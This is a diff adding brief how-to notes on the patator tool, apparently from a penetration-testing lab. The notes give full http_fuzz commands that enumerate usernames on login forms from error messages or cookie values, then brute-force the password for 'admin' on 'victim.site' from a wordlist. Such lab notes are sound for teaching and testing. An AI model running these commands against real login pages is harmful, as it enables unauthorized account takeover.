@@ -1,0 +1,20 @@
+Patator - How to
+
+patator http_fuzz -f
+
+Building the command, based on site parameters and options:
+patator http_fuzz url=http://userenumeration.site/login.php method=POST body='username=FILE0&password=test' 0=/root/Desktop/usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep='Invalid Username'
+
+For when the site doesn’t display whether is the wrong user or password:
+
+Check cookies, in Inspect Element, go to the Cookie tab, notice the PHPSESSID and result below it under User.
+
+patator http_fuzz url=http://userenumcookie.site/login.php method=POST body='username=FILE0&password=test' 0=/root/Desktop/usernames.txt follow=1 accept_cookie=1 -x ignore:fgrep=’wrong_user’
+
+
+Since we now have the username, we can now find the password, with a brute-force method.
+http://victim.site
+
+We try some credentials and we get “Invalid Credentials”.
+The parameters are ‘usr’ and ‘pwd’ inside of the Inspect Element.
+patator http_fuzz url=http://victim.site/login.php method=POST body='usr=admin&pwd=FILE0' 0=/root/Desktop/password.txt -x ignore:fgrep=’Invalid credentials’
